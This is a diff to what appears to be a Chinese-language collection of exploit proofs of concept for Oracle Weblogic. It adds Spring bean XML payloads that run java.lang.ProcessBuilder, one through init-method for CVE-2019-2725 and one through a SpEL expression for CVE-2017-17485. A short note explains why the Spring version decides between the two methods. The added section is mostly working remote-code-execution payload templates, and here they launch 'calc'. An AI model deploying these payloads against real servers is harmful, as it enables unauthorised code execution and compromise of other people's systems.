@@ -57,7 +57,27 @@ poc:
   </bean>
 </beans>
 ```
+或者spel3.xml内容：
+```xml
+<beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
+  <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
+     <constructor-arg value="calc" />
+  </bean>
+</beans>
+```
+>CVE-2017-17485 所用到的spring版本为5.0.2，它足够高，支持spel表达式的方法来初始化 bean 对象，而 Weblogic-CVE-2019-2725 所用到的spring版本过低，无法支持spel表达式，所以它需要通过指定 init-method 的方法来初始化 bean 对象。
 
+附`CVE-2017-17485`其payload：
+```xml
+<beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
+  <bean id="pb" class="java.lang.ProcessBuilder">
+     <constructor-arg value="calc.exe" />
+     <property name="whatever" value="#{ pb.start() }"/>
+  </bean>
+</beans>
+```
+
+来源： http://www.lmxspace.com/2019/05/15/Weblogic-CVE-2019-2725-%E9%80%9A%E6%9D%80payload/
 
 ### CVE-2019-2729_v10_UnitOfWorkChangeSet_jdk7u21
 
